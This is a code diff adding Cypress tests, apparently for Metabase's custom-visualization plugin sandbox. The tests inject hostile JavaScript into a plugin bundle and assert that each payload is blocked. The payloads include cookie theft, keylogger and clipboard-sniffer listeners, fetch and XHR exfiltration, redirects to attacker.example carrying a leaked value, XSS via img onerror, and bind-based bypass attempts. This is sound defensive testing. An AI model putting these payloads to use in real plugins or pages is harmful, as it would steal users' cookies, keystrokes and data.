@@ -1436,9 +1436,26 @@ describe("admin > custom visualizations", () => {
         );
       });
 
+      // Use current version of the SDK in the plugin.
+      cy.readFile(`${projectDir}/package.json`).then((pkg) => {
+        cy.writeFile(
+          `${projectDir}/package.json`,
+          JSON.stringify(
+            {
+              ...pkg,
+              devDependencies: {
+                ...(pkg?.devDependencies ?? {}),
+                "@metabase/custom-viz": `file:${sdkDir}`,
+              },
+            },
+            null,
+            2,
+          ),
+        );
+      });
+
       // Install dependencies in the tmp plugin folder.
       cy.exec(`cd "${projectDir}" && npm i`, { timeout: TIMEOUT });
-
       // Start the plugin dev server and keep it running
       cy.task<{ pid: number }>("startCustomVizDevServer", {
         cwd: projectDir,
@@ -1552,5 +1569,938 @@ describe("admin > custom visualizations", () => {
       cy.reload();
       H.main().findByText("18,760").should("be.visible");
     });
+  });
+});
+
+describe("sandbox", () => {
+  beforeEach(() => {
+    H.restore("postgres-writable");
+    cy.signInAsAdmin();
+    H.activateToken("bleeding-edge");
+    H.updateSetting("custom-viz-enabled", true);
+    H.addCustomVizPlugin(H.CUSTOM_VIZ_FIXTURE_TGZ);
+    H.createQuestion(
+      {
+        name: "Custom Viz Sandbox Test",
+        query: {
+          "source-table": SAMPLE_DB_TABLES.STATIC_ORDERS_ID,
+          aggregation: [["count"]],
+        },
+        display: H.CUSTOM_VIZ_DISPLAY,
+      },
+      { wrapId: true, idAlias: "sandboxCardId" },
+    );
+  });
+
+  const blockedPattern = (suffix: RegExp) =>
+    new RegExp(String.raw`\[plugin \d+\] blocked ${suffix.source}`);
+
+  const SANDBOX_CASES: Array<{
+    name: string;
+    payload: string;
+    errorPattern: RegExp;
+    before?: () => void;
+    additionalAssertions?: () => void;
+  }> = [
+    {
+      name: "window.fetch",
+      payload: 'window.fetch("/api/canary-should-be-blocked-by-sandbox");',
+      errorPattern: blockedPattern(/API call: window\.fetch/),
+      before: () => {
+        cy.intercept("GET", "/api/canary-should-be-blocked-by-sandbox").as(
+          "canary",
+        );
+      },
+      additionalAssertions: () => {
+        cy.get("@canary.all").should("have.length", 0);
+      },
+    },
+    {
+      name: "document.open",
+      payload: 'document.open("https://evilsite.example");',
+      errorPattern: blockedPattern(/API call: Document\.open/),
+    },
+    {
+      name: "document.cookie getter",
+      payload: "var stolen = document.cookie;",
+      errorPattern: blockedPattern(/API call: Document\.get cookie/),
+    },
+    {
+      name: "window.cookieStore getter",
+      payload: "var x = window.cookieStore;",
+      errorPattern: blockedPattern(/API call: Window\.get cookieStore/),
+    },
+    {
+      name: "StorageEvent.newValue getter",
+      payload:
+        'var e = new StorageEvent("storage", { newValue: "secret" }); var x = e.newValue;',
+      errorPattern: blockedPattern(/API call: StorageEvent\.get newValue/),
+    },
+    {
+      // document-level keydown listener is a global keylogger — captures
+      // every keystroke the user types anywhere on the host page.
+      name: 'document.addEventListener("keydown")',
+      payload: 'document.addEventListener("keydown", function(){}, true);',
+      errorPattern: blockedPattern(
+        /addEventListener for global event type: keydown/,
+      ),
+    },
+    {
+      // Same threat class — clipboard sniffer.
+      name: 'document.addEventListener("paste")',
+      payload: 'document.addEventListener("paste", function(){}, true);',
+      errorPattern: blockedPattern(
+        /addEventListener for global event type: paste/,
+      ),
+    },
+    {
+      // Refusing the listener also closes the metadata leak ("host wrote
+      // to localStorage") on top of the StorageEvent accessor blocks.
+      name: 'window.addEventListener("storage")',
+      payload: 'window.addEventListener("storage", function(){});',
+      errorPattern: blockedPattern(
+        /addEventListener for global event type: storage/,
+      ),
+    },
+    {
+      name: 'setAttribute("onclick", ...)',
+      payload: 'document.body.setAttribute("onclick", "alert(1)");',
+      errorPattern: blockedPattern(
+        /setAttribute for inline event handler: onclick/,
+      ),
+    },
+    {
+      name: "navigator.clipboard",
+      payload: "var c = navigator.clipboard;",
+      errorPattern: blockedPattern(/API call: Navigator\.get clipboard/),
+    },
+    {
+      // Hits createElementDistortion's BLOCKED_TAGS — different code path
+      // and different error format ("blocked createElement: <tag>") from
+      // the API-call cases above.
+      name: 'createElement("script")',
+      payload: 'document.createElement("script");',
+      errorPattern: blockedPattern(/createElement: script/),
+    },
+    {
+      name: 'createElement("a")',
+      payload: 'document.createElement("a");',
+      errorPattern: blockedPattern(/createElement: a/),
+    },
+    {
+      name: 'createElement("style")',
+      payload: 'document.createElement("style");',
+      errorPattern: blockedPattern(/createElement: style/),
+    },
+    {
+      name: 'createElement("area")',
+      payload: 'document.createElement("area");',
+      errorPattern: blockedPattern(/createElement: area/),
+    },
+    {
+      // Media elements load URLs via `src` / `srcset` — exfil GETs.
+      name: 'createElement("video")',
+      payload: 'document.createElement("video");',
+      errorPattern: blockedPattern(/createElement: video/),
+    },
+    {
+      // <input type="image"> fires a GET to src on render; the broader
+      // <input> block also covers phishing UI.
+      name: 'createElement("input")',
+      payload: 'document.createElement("input");',
+      errorPattern: blockedPattern(/createElement: input/),
+    },
+    {
+      name: 'createElementNS(SVG, "use")',
+      payload: 'document.createElementNS("http://www.w3.org/2000/svg", "use");',
+      errorPattern: blockedPattern(/createElementNS: use/),
+    },
+    // `eval` / `new Function(...)` Near membrane allows these in the sandbox, but
+    // it still catches anything they evaluate (e.g. `eval('window.fetch(...)')` triggers the fetch
+    // distortion), so it's not an escape — just not blocked at access.
+    {
+      name: "eval-evaluated fetch",
+      payload:
+        "eval('window.fetch(\"/api/canary-should-be-blocked-by-sandbox\")');",
+      errorPattern: blockedPattern(/API call: window\.fetch/),
+      before: () => {
+        cy.intercept("GET", "/api/canary-should-be-blocked-by-sandbox").as(
+          "canary",
+        );
+      },
+      additionalAssertions: () => {
+        cy.get("@canary.all").should("have.length", 0);
+      },
+    },
+    {
+      name: "XMLHttpRequest",
+      payload: "new XMLHttpRequest();",
+      errorPattern: blockedPattern(/API call: window\.XMLHttpRequest/),
+    },
+    {
+      name: "document.cookie setter",
+      payload: 'document.cookie = "${document.cookie}stolen=1;";',
+      errorPattern: blockedPattern(/API call: Document\.set cookie/),
+    },
+    {
+      name: "window.open",
+      payload: 'window.open("/api/canary-should-be-blocked-by-sandbox");',
+      errorPattern: blockedPattern(/API call: window\.open/),
+      before: () => {
+        cy.intercept("GET", "/api/canary-should-be-blocked-by-sandbox").as(
+          "canary",
+        );
+      },
+      additionalAssertions: () => {
+        cy.get("@canary.all").should("have.length", 0);
+      },
+    },
+    {
+      name: "document.write",
+      payload: 'document.write("<p>injected</p>");',
+      errorPattern: blockedPattern(/API call: Document\.write/),
+    },
+    {
+      name: 'setAttribute("onerror", ...)',
+      payload: 'document.body.setAttribute("onerror", "alert(1)");',
+      errorPattern: blockedPattern(
+        /setAttribute for inline event handler: onerror/,
+      ),
+    },
+    {
+      name: 'setAttribute("href", "javascript:...")',
+      payload: 'document.body.setAttribute("href", "javascript:alert(1)");',
+      errorPattern: blockedPattern(/setAttribute with javascript: URL: href/),
+    },
+    {
+      // Try to defeat the membrane by binding a non-allowlisted native.
+      // Safe because `window.fetch` access already
+      // returns a `blocked` function. Binding it produces a bound
+      // function that still throws when called.
+      name: "window.fetch.bind(window) bypass attempt",
+      payload:
+        'window.fetch.bind(window)("/api/canary-should-be-blocked-by-sandbox");',
+      errorPattern: blockedPattern(/API call: window\.fetch/),
+      before: () => {
+        cy.intercept("GET", "/api/canary-should-be-blocked-by-sandbox").as(
+          "canary",
+        );
+      },
+      additionalAssertions: () => {
+        cy.get("@canary.all").should("have.length", 0);
+      },
+    },
+    {
+      // Try to bypass via Function.prototype.bind.call. Confirms the check
+      // isn't sensitive to which side initiates the bind.
+      name: "Function.prototype.bind.call(window.fetch, ...) bypass attempt",
+      payload:
+        'Function.prototype.bind.call(window.fetch, window)("/api/canary-should-be-blocked-by-sandbox");',
+      errorPattern: blockedPattern(/API call: window\.fetch/),
+      before: () => {
+        cy.intercept("GET", "/api/canary-should-be-blocked-by-sandbox").as(
+          "canary",
+        );
+      },
+      additionalAssertions: () => {
+        cy.get("@canary.all").should("have.length", 0);
+      },
+    },
+    {
+      name: "Worker constructor",
+      payload: 'new Worker("data:text/javascript,1");',
+      errorPattern: blockedPattern(/API call: window\.Worker/),
+    },
+    {
+      name: "SharedWorker constructor",
+      payload: 'new SharedWorker("data:text/javascript,1");',
+      errorPattern: blockedPattern(/API call: window\.SharedWorker/),
+    },
+    {
+      name: "RTCPeerConnection constructor",
+      payload: "new RTCPeerConnection();",
+      errorPattern: blockedPattern(/API call: window\.RTCPeerConnection/),
+    },
+    {
+      name: "WebTransport constructor",
+      payload: 'new WebTransport("https://attacker.example/wt");',
+      errorPattern: blockedPattern(/API call: WebTransport/),
+    },
+    {
+      name: "BroadcastChannel constructor",
+      payload: 'new BroadcastChannel("attacker");',
+      errorPattern: blockedPattern(/API call: BroadcastChannel/),
+    },
+    {
+      name: "Range.createContextualFragment",
+      payload:
+        'document.createRange().createContextualFragment("<img src=x>");',
+      errorPattern: blockedPattern(/API call: Range\.createContextualFragment/),
+    },
+    {
+      name: "DOMParser.parseFromString",
+      payload: 'new DOMParser().parseFromString("<p>x</p>", "text/html");',
+      errorPattern: blockedPattern(/API call: DOMParser\.parseFromString/),
+    },
+    {
+      name: "Element.setHTMLUnsafe",
+      payload: 'document.createElement("div").setHTMLUnsafe("<x>");',
+      errorPattern: blockedPattern(/API call: Element\.setHTMLUnsafe/),
+    },
+    {
+      name: "Document.parseHTMLUnsafe",
+      payload: 'Document.parseHTMLUnsafe("<p>x</p>");',
+      errorPattern: blockedPattern(/API call: Document\.parseHTMLUnsafe/),
+    },
+    {
+      name: "XSLTProcessor constructor",
+      payload: "new XSLTProcessor();",
+      errorPattern: blockedPattern(/API call: XSLTProcessor/),
+    },
+    {
+      name: "window.alert",
+      payload: 'window.alert("pwned");',
+      errorPattern: blockedPattern(/API call: window\.alert/),
+    },
+    {
+      name: "window.confirm",
+      payload: 'window.confirm("pwned");',
+      errorPattern: blockedPattern(/API call: window\.confirm/),
+    },
+    {
+      name: "window.prompt",
+      payload: 'window.prompt("pwned");',
+      errorPattern: blockedPattern(/API call: window\.prompt/),
+    },
+    {
+      name: "window.print",
+      payload: "window.print();",
+      errorPattern: blockedPattern(/API call: window\.print/),
+    },
+    {
+      name: "Notification constructor",
+      payload: 'new Notification("phish");',
+      errorPattern: blockedPattern(/API call: window\.Notification/),
+    },
+    {
+      // `.click()` is on HTMLElement.prototype, so any non-blocked element
+      // exercises the same membrane path as a synthesized anchor would.
+      name: "HTMLElement.click()",
+      payload: 'document.createElement("div").click();',
+      errorPattern: blockedPattern(/API call: HTMLElement\.click/),
+    },
+    {
+      name: "FontFace.load",
+      payload:
+        'new FontFace("x", "url(/api/canary-should-be-blocked-by-sandbox)").load();',
+      errorPattern: blockedPattern(/API call: FontFace\.load/),
+      before: () => {
+        cy.intercept("GET", "/api/canary-should-be-blocked-by-sandbox").as(
+          "canary",
+        );
+      },
+      additionalAssertions: () => {
+        cy.get("@canary.all").should("have.length", 0);
+      },
+    },
+    {
+      name: "document.adoptedStyleSheets setter",
+      payload: "document.adoptedStyleSheets = [];",
+      errorPattern: blockedPattern(
+        /API call: Document\.set adoptedStyleSheets/,
+      ),
+    },
+    {
+      name: "document.adoptedStyleSheets getter",
+      payload: "var x = document.adoptedStyleSheets;",
+      errorPattern: blockedPattern(
+        /API call: Document\.get adoptedStyleSheets/,
+      ),
+    },
+    {
+      name: "ShadowRoot.adoptedStyleSheets setter",
+      payload:
+        'document.createElement("div").attachShadow({ mode: "open" }).adoptedStyleSheets = [];',
+      errorPattern: blockedPattern(
+        /API call: ShadowRoot\.set adoptedStyleSheets/,
+      ),
+    },
+    {
+      name: "CSSStyleSheet.replaceSync",
+      payload: 'new CSSStyleSheet().replaceSync("");',
+      errorPattern: blockedPattern(/API call: CSSStyleSheet\.replaceSync/),
+    },
+    {
+      name: "history.state getter",
+      payload: "var x = history.state;",
+      errorPattern: blockedPattern(/API call: History\.get state/),
+    },
+    {
+      name: "performance.getEntries",
+      payload: "performance.getEntries();",
+      errorPattern: blockedPattern(/API call: Performance\.getEntries/),
+    },
+    {
+      name: "PerformanceObserver constructor",
+      payload: "new PerformanceObserver(function() {});",
+      errorPattern: blockedPattern(/API call: PerformanceObserver/),
+    },
+    {
+      name: "document.referrer getter",
+      payload: "var x = document.referrer;",
+      errorPattern: blockedPattern(/API call: Document\.get referrer/),
+    },
+    {
+      name: "document.URL getter",
+      payload: "var x = document.URL;",
+      errorPattern: blockedPattern(/API call: Document\.get URL/),
+    },
+    {
+      name: "document.documentURI getter",
+      payload: "var x = document.documentURI;",
+      errorPattern: blockedPattern(/API call: Document\.get documentURI/),
+    },
+    {
+      name: "document.baseURI getter",
+      payload: "var x = document.baseURI;",
+      errorPattern: blockedPattern(/API call: Node\.get baseURI/),
+    },
+    {
+      name: "document.designMode setter",
+      payload: 'document.designMode = "on";',
+      errorPattern: blockedPattern(/API call: Document\.set designMode/),
+    },
+    {
+      name: "element.contentEditable setter",
+      payload: 'document.createElement("div").contentEditable = "true";',
+      errorPattern: blockedPattern(
+        /API call: HTMLElement\.set contentEditable/,
+      ),
+    },
+    {
+      name: "HTMLDialogElement.showModal",
+      payload: 'document.createElement("dialog").showModal();',
+      errorPattern: blockedPattern(/API call: HTMLDialogElement\.showModal/),
+    },
+    {
+      name: "Element.requestFullscreen",
+      payload: 'document.createElement("div").requestFullscreen();',
+      errorPattern: blockedPattern(/API call: Element\.requestFullscreen/),
+    },
+    {
+      name: "PaymentRequest constructor",
+      payload: "new PaymentRequest([], {});",
+      errorPattern: blockedPattern(/API call: PaymentRequest/),
+    },
+    {
+      name: "Attr.value setter (onclick handler)",
+      payload: `
+        var attr = document.createAttribute("onclick");
+        attr.value = "alert(1)";
+      `,
+      errorPattern: blockedPattern(
+        /Attr\.set value for inline event handler: onclick/,
+      ),
+    },
+    {
+      name: "Attr.value setter (post-hoc javascript: URL)",
+      payload: `
+        document.body.setAttribute("href", "/safe");
+        var attr = document.body.getAttributeNode("href");
+        attr.value = "javascript:alert(1)";
+      `,
+      errorPattern: blockedPattern(
+        /Attr\.set value with javascript: URL: href/,
+      ),
+    },
+    {
+      name: "ShadowRoot.setHTMLUnsafe",
+      payload:
+        'document.createElement("div").attachShadow({ mode: "open" }).setHTMLUnsafe("<x>");',
+      errorPattern: blockedPattern(/API call: ShadowRoot\.setHTMLUnsafe/),
+    },
+    {
+      // caret*FromPoint is the only non-interaction-gated way to get a raw
+      // host Text node; blocked because the Element-level DOM decoy doesn't
+      // cover this entry point.
+      name: "Document.caretRangeFromPoint",
+      payload: "document.caretRangeFromPoint(0, 0);",
+      errorPattern: blockedPattern(/API call: Document\.caretRangeFromPoint/),
+    },
+  ];
+
+  it("blocks browser APIs that are not allowed in the sandbox", () => {
+    const bundle = SANDBOX_CASES.map((c, index) => {
+      const delay = 1000 + index * 100;
+      return `window.setTimeout(function() { try { ${c.payload} } catch (e) { console.error(e); } }, ${delay});`;
+    }).join("\n");
+
+    cy.intercept("GET", "/api/ee/custom-viz-plugin/*/bundle*", (req) => {
+      req.continue((res) => {
+        res.body = `console.log("injected bundle");${bundle}\n${String(res.body)};\n`;
+        res.send();
+      });
+    }).as("injectedBundle");
+    H.visitQuestion("@sandboxCardId", {
+      onBeforeLoad(win) {
+        cy.spy(win.console, "log").as("consoleLog");
+        cy.spy(win.console, "error").as("consoleError");
+      },
+    });
+    cy.wait("@injectedBundle");
+    cy.get("@consoleLog").should("be.calledWith", "injected bundle");
+
+    for (const {
+      name,
+      errorPattern,
+      before,
+      additionalAssertions,
+    } of SANDBOX_CASES) {
+      before?.();
+      cy.log(`Verifying error pattern for: ${name}`);
+      cy.get("@consoleError").should(
+        "have.been.calledWithMatch",
+        Cypress.sinon.match.has("message", Cypress.sinon.match(errorPattern)),
+      );
+      additionalAssertions?.();
+    }
+  });
+
+  // `window.location` and the Location attributes are `[LegacyUnforgeable]`,
+  // and `near-membrane-dom` gives the plugin its own iframe realm with its
+  // own Location instance, so we can't intercept these at the membrane (see
+  // the comment in distortions-blocked-apis.ts). What we *can*  verify is that the host page is intact.
+  it("plugin location operations do not navigate the host", () => {
+    const payloads = [
+      'location.href = "https://attacker.example/?leak=secret";',
+      'location.assign("https://attacker.example/");',
+      'location.replace("https://attacker.example/");',
+      'window.location = "https://attacker.example/";',
+      'location.pathname = "/attacker-pwned";',
+      'location.search = "?attacker-pwned=1";',
+      'location.hash = "#attacker-pwned";',
+    ];
+    // Run inline in the bundle preamble. Each is wrapped in try/catch so an
+    // attempt that errors doesn't short-circuit the rest.
+    const attackBundle = payloads
+      .map((p) => `try { ${p} } catch (e) {}`)
+      .join("\n");
+
+    cy.intercept("GET", "/api/ee/custom-viz-plugin/*/bundle*", (req) => {
+      req.continue((res) => {
+        res.body = `${attackBundle}\n${String(res.body)};\n`;
+        res.send();
+      });
+    }).as("injectedBundle");
+
+    H.visitQuestion("@sandboxCardId");
+    cy.wait("@injectedBundle");
+
+    cy.findByRole("heading", {
+      name: "Custom viz rendered successfully",
+    }).should("be.visible");
+
+    cy.location("pathname").should("match", /\/question/);
+    cy.location("href").then((href) => {
+      expect(href).not.to.include("attacker");
+    });
+    cy.location("search").should("not.contain", "attacker-pwned");
+    cy.location("hash").should("not.contain", "attacker-pwned");
+  });
+
+  // innerHTML/outerHTML/insertAdjacentHTML go through DOMPurify rather than
+  // being blocked outright, so this case doesn't fit the "expect a thrown
+  // error and a fallback viz" shape of SANDBOX_CASES. Instead we inject an
+  // <img onerror> — which the browser would execute in the host realm if it
+  // survived assignment — and confirm DOMPurify stripped it by checking the
+  // onerror's side effect (a fetch to the canary URL) never happens.
+  it("sanitizes innerHTML through DOMPurify before it reaches the DOM", () => {
+    cy.intercept("GET", "/api/canary-should-be-blocked-by-sandbox").as(
+      "canary",
+    );
+
+    const payload = `
+      var d = document.createElement('div');
+      d.innerHTML = '<img src="x" onerror="fetch(\\'/api/canary-should-be-blocked-by-sandbox\\')">';
+      document.body.appendChild(d);
+    `;
+
+    cy.intercept("GET", "/api/ee/custom-viz-plugin/*/bundle*", (req) => {
+      req.continue((res) => {
+        res.body = `${payload}\n${String(res.body)};\n`;
+        res.send();
+      });
+    }).as("injectedBundle");
+
+    H.visitQuestion("@sandboxCardId", {
+      onBeforeLoad(win) {
+        cy.spy(win.console, "log").as("consoleLog");
+        cy.spy(win.console, "error").as("consoleError");
+      },
+    });
+    cy.wait("@injectedBundle");
+
+    // Viz still renders — sanitization mutates the HTML but doesn't throw.
+    cy.findByRole("heading", {
+      name: "Custom viz rendered successfully",
+    }).should("be.visible");
+    cy.get("@canary.all").should("have.length", 0);
+    cy.get("@consoleError").should(
+      "have.been.calledWithMatch",
+      /\[plugin \d+\] DOMPurify stripped content from innerHTML/,
+    );
+  });
+
+  it("sanitizes ShadowRoot.innerHTML through DOMPurify before it reaches the DOM", () => {
+    cy.intercept("GET", "/api/canary-should-be-blocked-by-sandbox").as(
+      "canary",
+    );
+
+    const payload = `
+      var host = document.createElement('div');
+      var shadow = host.attachShadow({ mode: 'open' });
+      shadow.innerHTML = '<img src="x" onerror="fetch(\\'/api/canary-should-be-blocked-by-sandbox\\')">';
+      document.body.appendChild(host);
+    `;
+
+    cy.intercept("GET", "/api/ee/custom-viz-plugin/*/bundle*", (req) => {
+      req.continue((res) => {
+        res.body = `${payload}\n${String(res.body)};\n`;
+        res.send();
+      });
+    }).as("injectedBundle");
+
+    H.visitQuestion("@sandboxCardId", {
+      onBeforeLoad(win) {
+        cy.spy(win.console, "log").as("consoleLog");
+        cy.spy(win.console, "error").as("consoleError");
+      },
+    });
+    cy.wait("@injectedBundle");
+
+    cy.findByRole("heading", {
+      name: "Custom viz rendered successfully",
+    }).should("be.visible");
+    cy.get("@canary.all").should("have.length", 0);
+    cy.get("@consoleError").should(
+      "have.been.calledWithMatch",
+      /\[plugin \d+\] DOMPurify stripped content from ShadowRoot\.innerHTML/,
+    );
+  });
+
+  // `Document` is itself a Node, so it's a valid root for TreeWalker /
+  // NodeIterator and a valid target for `MutationObserver.observe`. With
+  // an Element-only decoy, the plugin could pass `document` as the root
+  // and walk the entire host DOM, surfacing real host Text nodes that
+  // weren't decoyed. Locking this down requires the Node-level decoy.
+  it("decoys non-Element nodes reached via TreeWalker rooted at document", () => {
+    const HOST_MARKER_TEXT = "treewalker-host-canary-do-not-leak";
+
+    const payload = `
+      setTimeout(function() {
+        var walker = document.createTreeWalker(document, NodeFilter.SHOW_TEXT);
+        var sawMarker = false;
+        var node;
+        let nonEmptyCount = 0;
+        while ((node = walker.nextNode())) {
+          if ((node.textContent || "").indexOf(${JSON.stringify(HOST_MARKER_TEXT)}) !== -1) {
+            sawMarker = true;
+            break;
+          }
+          if (node.textContent && node.textContent.trim() !== "") {
+            nonEmptyCount++;
+          }
+        }
+        console.log('plugin treewalker(document) saw host marker:', sawMarker);
+        console.log('plugin treewalker(document) saw non-empty nodes:', nonEmptyCount);
+      }, 1500);
+    `;
+
+    cy.intercept("GET", "/api/ee/custom-viz-plugin/*/bundle*", (req) => {
+      req.continue((res) => {
+        res.body = `${payload}\n${String(res.body)};\n`;
+        res.send();
+      });
+    }).as("injectedBundle");
+
+    H.visitQuestion("@sandboxCardId", {
+      onBeforeLoad(win) {
+        cy.spy(win.console, "log").as("consoleLog");
+      },
+    });
+    cy.wait("@injectedBundle");
+
+    cy.window().then((win) => {
+      const marker = win.document.createElement("span");
+      marker.id = "treewalker-host-marker";
+      marker.textContent = HOST_MARKER_TEXT;
+      win.document.body.appendChild(marker);
+    });
+
+    cy.findByRole("heading", {
+      name: "Custom viz rendered successfully",
+    }).should("be.visible");
+
+    cy.get("@consoleLog").should(
+      "have.been.calledWith",
+      "plugin treewalker(document) saw host marker:",
+      false,
+    );
+    cy.get("@consoleLog").should(
+      "have.been.calledWith",
+      "plugin treewalker(document) saw non-empty nodes:",
+      13,
+    );
+  });
+
+  // Direct access is closed by near-membrane-dom's default behavior: it
+  // remaps only the own keys of a fresh sandbox iframe's window from host to plugin.
+  it("does not expose host-app globals to the plugin", () => {
+    const payload = `
+      setTimeout(function() {
+        console.log("plugin sees MetabaseBootstrap:", typeof window.MetabaseBootstrap);
+        try {
+          console.log(
+            "plugin sees parent.MetabaseBootstrap:",
+            typeof (window.parent && window.parent.MetabaseBootstrap)
+          );
+        } catch (e) {
+          console.log("plugin sees parent.MetabaseBootstrap:", "throws");
+        }
+
+        try {
+          console.log(
+            "plugin sees defaultView.MetabaseBootstrap:",
+            typeof (document.defaultView && document.defaultView.MetabaseBootstrap)
+          );
+        } catch (e) {
+          console.log("plugin sees defaultView.MetabaseBootstrap:", "throws");
+        }
+        console.log("plugin sees MetabaseUserLocalization:", typeof window.MetabaseUserLocalization);
+        console.log("plugin sees MetabaseSiteLocalization:", typeof window.MetabaseSiteLocalization);
+        console.log("plugin sees SECRET:", typeof window.SECRET);
+      }, 500);
+    `;
+
+    cy.intercept("GET", "/api/ee/custom-viz-plugin/*/bundle*", (req) => {
+      req.continue((res) => {
+        res.body = `${payload}\n${String(res.body)};\n`;
+        res.send();
+      });
+    }).as("injectedBundle");
+
+    H.visitQuestion("@sandboxCardId", {
+      onBeforeLoad(win) {
+        cy.spy(win.console, "log").as("consoleLog");
+      },
+    });
+    cy.window().then((win) => {
+      // @ts-expect-error - test window property
+      win.SECRET = "abracadabra";
+    });
+    cy.wait("@injectedBundle");
+
+    cy.findByRole("heading", {
+      name: "Custom viz rendered successfully",
+    }).should("be.visible");
+
+    cy.get("@consoleLog").should(
+      "have.been.calledWith",
+      "plugin sees MetabaseBootstrap:",
+      "undefined",
+    );
+    cy.get("@consoleLog").should(
+      "have.been.calledWith",
+      "plugin sees parent.MetabaseBootstrap:",
+      "undefined",
+    );
+    cy.get("@consoleLog").should(
+      "have.been.calledWith",
+      "plugin sees defaultView.MetabaseBootstrap:",
+      "undefined",
+    );
+    cy.get("@consoleLog").should(
+      "have.been.calledWith",
+      "plugin sees MetabaseUserLocalization:",
+      "undefined",
+    );
+    cy.get("@consoleLog").should(
+      "have.been.calledWith",
+      "plugin sees MetabaseSiteLocalization:",
+      "undefined",
+    );
+  });
+
+  it("isolates DOM access to the plugin subtree (out-of-scope reads and writes hit a decoy)", () => {
+    const hostSelector = "#root";
+    const payload = `
+      var hostEl = document.querySelector('${hostSelector}');
+      if (hostEl) {
+        const elementId = hostEl.getAttribute("id");
+        hostEl.setAttribute('data-pwned-by-plugin', 'true');
+        console.log('plugin read element id', elementId);
+        console.log('plugin saw decoy', hostEl.getAttribute('data-plugin-sandbox-decoy'));
+      } else {
+        console.log('plugin-saw-decoy', false);
+      }
+    `;
+
+    cy.intercept("GET", "/api/ee/custom-viz-plugin/*/bundle*", (req) => {
+      req.continue((res) => {
+        res.body = `${payload}\n${String(res.body)};\n`;
+        res.send();
+      });
+    }).as("injectedBundle");
+
+    H.visitQuestion("@sandboxCardId", {
+      onBeforeLoad(win) {
+        cy.spy(win.console, "log").as("consoleLog");
+        cy.spy(win.console, "error").as("consoleError");
+      },
+    });
+    cy.wait("@injectedBundle");
+
+    cy.findByRole("heading", {
+      name: "Custom viz rendered successfully",
+    }).should("be.visible");
+
+    // The plugin reached for visualization-root but received a decoy with
+    // data-plugin-sandbox-decoy="true" instead of the real element.
+    cy.get("@consoleLog").should(
+      "have.been.calledWith",
+      "plugin saw decoy",
+      "true",
+    );
+    cy.get("@consoleLog").should(
+      "have.been.calledWith",
+      "plugin read element id",
+      "sandbox-decoy",
+    );
+
+    // The swap is reported to host console for diagnostics.
+    cy.get("@consoleError").should(
+      "have.been.calledWithMatch",
+      /\[plugin \d+\] swapped out-of-scope <div id="root"> with decoy/,
+    );
+
+    // The real host element was untouched.
+    cy.get(hostSelector).should("not.have.attr", "data-pwned-by-plugin");
+  });
+
+  it("returns a decoy when the plugin walks up to its container's parentElement/parentNode", () => {
+    const payload = `
+      setTimeout(function() {
+        var container = document.querySelector('[data-plugin-sandbox]');
+        if (!container) {
+          console.log('plugin parent test:', 'no container');
+          return;
+        }
+        const { parentElement, parentNode} = container;
+        console.log('plugin parentElement decoy:', parentElement && parentElement.getAttribute('data-plugin-sandbox-decoy'));
+        console.log('plugin parentElement id:', parentElement && parentElement.getAttribute('id'));
+        console.log('plugin parentNode decoy:', parentNode && parentNode.getAttribute && parentNode.getAttribute('data-plugin-sandbox-decoy'));
+        if (parentElement) {
+          parentElement.setAttribute('data-pwned-by-plugin', 'true');
+        }
+      }, 1000);
+    `;
+
+    cy.intercept("GET", "/api/ee/custom-viz-plugin/*/bundle*", (req) => {
+      req.continue((res) => {
+        res.body = `${String(res.body)};\n${payload}`;
+        res.send();
+      });
+    }).as("injectedBundle");
+
+    H.visitQuestion("@sandboxCardId", {
+      onBeforeLoad(win) {
+        cy.spy(win.console, "log").as("consoleLog");
+        cy.spy(win.console, "error").as("consoleError");
+      },
+    });
+    cy.wait("@injectedBundle");
+
+    cy.findByRole("heading", {
+      name: "Custom viz rendered successfully",
+    }).should("be.visible");
+
+    cy.get("@consoleLog").should(
+      "have.been.calledWith",
+      "plugin parentElement decoy:",
+      "true",
+    );
+    cy.get("@consoleLog").should(
+      "have.been.calledWith",
+      "plugin parentElement id:",
+      "sandbox-decoy",
+    );
+    cy.get("@consoleLog").should(
+      "have.been.calledWith",
+      "plugin parentNode decoy:",
+      "true",
+    );
+
+    cy.get("@consoleError").should(
+      "have.been.calledWithMatch",
+      /\[plugin \d+\] swapped out-of-scope <div.*> with decoy/,
+    );
+
+    cy.get("[data-plugin-sandbox]")
+      .parent()
+      .should("not.have.attr", "data-pwned-by-plugin");
+  });
+
+  it("MutationObserver on out-of-scope nodes observes a decoy and never fires for host mutations", () => {
+    const payload = `
+      var seenMutations = 0;
+      var observer = new MutationObserver(function(records) {
+        seenMutations += records.length;
+      });
+      observer.observe(document.body, {
+        childList: true,
+        subtree: true,
+        attributes: true,
+      });
+      setTimeout(function() {
+        console.log('plugin observed mutations:', seenMutations);
+      }, 1500);
+    `;
+
+    cy.intercept("GET", "/api/ee/custom-viz-plugin/*/bundle*", (req) => {
+      req.continue((res) => {
+        res.body = `${payload}\n${String(res.body)};\n`;
+        res.send();
+      });
+    }).as("injectedBundle");
+
+    H.visitQuestion("@sandboxCardId", {
+      onBeforeLoad(win) {
+        cy.spy(win.console, "log").as("consoleLog");
+        cy.spy(win.console, "error").as("consoleError");
+      },
+    });
+    cy.wait("@injectedBundle");
+
+    cy.findByRole("heading", {
+      name: "Custom viz rendered successfully",
+    }).should("be.visible");
+
+    // Mutate the real host DOM. If the plugin held a real reference to
+    // document.body, these would fire its observer. The membrane swapped
+    // body for a detached decoy, so observation is wired to a node that
+    // never sees host changes.
+    cy.document().then((doc) => {
+      const probe = doc.createElement("div");
+      probe.setAttribute("data-mutation-probe", "true");
+      doc.body.appendChild(probe);
+      doc.body.setAttribute("data-mutation-probe-attr", "true");
+      probe.remove();
+      doc.body.removeAttribute("data-mutation-probe-attr");
+    });
+
+    cy.get("@consoleError").should(
+      "have.been.calledWithMatch",
+      /\[plugin \d+\] swapped out-of-scope <body> with decoy/,
+    );
   });
 });
